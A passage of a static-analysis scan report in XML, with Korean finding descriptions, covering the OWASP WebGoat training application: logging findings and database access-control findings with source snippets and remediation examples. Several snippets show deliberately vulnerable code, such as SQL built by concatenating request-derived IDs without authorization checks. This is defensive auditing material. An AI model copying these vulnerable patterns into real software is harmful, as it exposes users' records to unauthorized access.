<Snippet>	protected Element createContent( WebSession s )
	{
		System.out.println( "errorscreen createContent Error:" + this.error + " message:" + this.message );

		Element content;</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="94A247653D76C6BA23C0DA95B0B9F58A" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>85</LineStart>
<Snippet>	    catch (UnauthorizedException ue2)
	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C9B7F179D1AC7212CFA1CDE9DF86E255" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>337</LineStart>
<Snippet>	catch (ParameterNotFoundException pnfe)
	{
	    System.out.println("Missing parameter");
	    pnfe.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EF33CFB3A56FDED88A0DC2F69C48F47E" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>316</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F4B475B4F506571016E001D817D6A304" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>307</LineStart>
<Snippet>		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }
</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7497B4CA2446070F8A20CEA85B7891EC" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>378</LineStart>
<Snippet>	    {
		s.setMessage("You are not authorized to perform this function");
		System.out.println("Authorization failure");
		ue2.printStackTrace();
	    }</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="85D7846F84F575458FB183B74A4F3AD0" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>384</LineStart>
<Snippet>	    {
		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8D532A349AF19BDE1F086067626CDC84" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>전용 로깅 기능 대신 println()을 사용하면 프로그램 동작을 모니터링하기가 어렵습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>366</LineStart>
<Snippet>	    {
		// All other errors send the user to the generic error page
		System.out.println("handleRequest() error");
		e.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);</Snippet>
<TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="64">
                        <groupTitle>Access Control: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>적절한 access control 없이 EditProfile.java의 getEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 96 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>데이터베이스 Access control 오류는 다음 경우에 발생합니다.

1.	신뢰할 수 없는 소스에서 데이터가 프로그램에 입력됩니다.


2.	데이터는 SQL 쿼리에서 기본 키의 값을 지정하는 데 사용됩니다.



예제 1: 다음 코드는 메타 문자를 이스케이프 처리하고 SQL injection 취약성을 예방하는 매개 변수가 있는 SQL 문을 사용하여 지정한 ID [1]에 일치하는 송장을 검색하는 SQL 쿼리를 생성하여 실행합니다. ID는 현재 인증된 사용자와 관련이 있는 모든 송장 목록에서 선택합니다.


...
id = Integer.decode(request.getParameter("invoiceID"));
String query = "SELECT * FROM invoices WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
ResultSet results = stmt.execute();
...



문제는 개발자가 id의 가능한 모든 값을 고려할 수 없다는 점입니다. 인터페이스에서 현재 사용자의 송장 ID 목록을 생성하더라도 공격자는 이 인터페이스를 무시하고 원하는 송장을 요청할 수 있습니다. 이 예제의 코드가 사용자가 요청한 송장에 접근할 수 있는 권한이 있는지 확인하지 않기 때문에 현재 사용자의 송장이 아닌 송장도 모두 표시합니다.

모바일 환경에서는 데이터베이스 Access control 오류와 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.


예제 2: 다음 코드는 Example 1을 Android 플랫폼에 맞게 조정합니다.


...
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id});
...


많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Access Control은 표현 계층에 의존하여 사용자가 전송한 값을 제한하기보다는 응용 프로그램 및 데이터베이스 계층에서 처리해야 합니다. 어떤 경우에도 사용자가 해당 권한 없이 데이터베이스의 행을 검색하거나 수정하는 것을 허용해서는 안 됩니다. 데이터베이스에 접근하는 모든 쿼리는 이 정책을 따라야 하는데 이는 현재 인증된 사용자 이름을 쿼리에 포함하기만 하면 구현할 수 있습니다. 


예제 3: 다음 코드는 Example 1과 같은 기능을 구현하지만 송장이 현재 인증된 사용자에게 속하는지 확인하기 위한 추가 제약 조건을 부과합니다.


...
userName = ctx.getAuthenticatedUserName();
id = Integer.decode(request.getParameter("invoiceID"));
String query =
        "SELECT * FROM invoices WHERE id = ? AND user = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, id);
stmt.setString(2, userName);
ResultSet results = stmt.execute();
...



Android에 해당하는 코드는 다음과 같습니다.


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String id = this.getIntent().getExtras().getString("invoiceID");
        String query = "SELECT * FROM invoices WHERE id = ? AND user = ?";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, new Object[]{id, userName});
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>64</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="0DA0041D3C6BAE4717A9B21E3536F6DE" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F89DFC55CB85D81ED0EA071BF7FCD14" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="822E25B2ABD23FC797422D1D437E00E8" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 getUserName() 메서드는 공격자가 제어하는 기본 키를 포함하는 203 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="45C5DE1B3842C76A59FC92166E850EBD" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 256 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>256</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				authorized = answer_results.first();
				</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3953DF6D1FD8CD9B3AAE359C0D88DBA7" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SoapRequest.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 419 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>419</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>437</LineStart>
<Snippet>

    public String getCreditCard(int id)
    {
	String result = getResults(id, "cc_number");</Snippet>
<TargetFunction>getCreditCard(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E0EBA09191C5892E861B85728D311174" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SqlNumericInjection.java의 parameterizedQuery() 메서드는 공격자가 제어하는 기본 키를 포함하는 207 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>207</LineStart>
<Snippet>			query, ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		statement.setInt(1, Integer.parseInt(station));
		ResultSet results = statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F72229B57AC19054FB8B361DB503B8F" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 StoredXss.java의 makeCurrent() 메서드는 공격자가 제어하는 기본 키를 포함하는 223 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>223</LineStart>
<Snippet>		    ResultSet.CONCUR_READ_ONLY);
	    statement.setString(1, getNameroot(s.getUserName()) + "%");
	    statement.setInt(2, messageNum);
	    ResultSet results = statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E5D8AA978A0CF800779844396856DA52" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 312 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>312</LineStart>
<Snippet>				PreparedStatement answer_statement = WebSession.getConnection(s).prepareStatement( query, 
						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="953A2B1170564A53B40368FB83BA0AB1" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 getUserName() 메서드는 공격자가 제어하는 기본 키를 포함하는 203 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A809EF5CBDC04EFA711C6C43AA8D822D" ruleID="264C499A-C0F5-479E-9758-9E8C24468D70">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 changeEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 248 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>139</LineStart>
<Snippet>	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));
	String startDate = request.getParameter(CrossSiteScripting.START_DATE);
	int salary = Integer.parseInt(request</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="353BEB1EA8A6913149908F465F6C4554" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ViewProfile.java의 getEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 112 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5E48E83194156E1E1DAB63C65687F387" ruleID="264C499A-C0F5-479E-9758-9E8C24468D70">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 changeEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 248 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>145</LineStart>
<Snippet>	String ccn = request.getParameter(CrossSiteScripting.CCN);
	int ccnLimit = Integer.parseInt(request
		.getParameter(CrossSiteScripting.CCN_LIMIT));
	String disciplinaryActionDate = request
		.getParameter(CrossSiteScripting.DISCIPLINARY_DATE);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BDC6F48151961772E313FA1050BC6F15" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 getUserName() 메서드는 공격자가 제어하는 기본 키를 포함하는 203 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
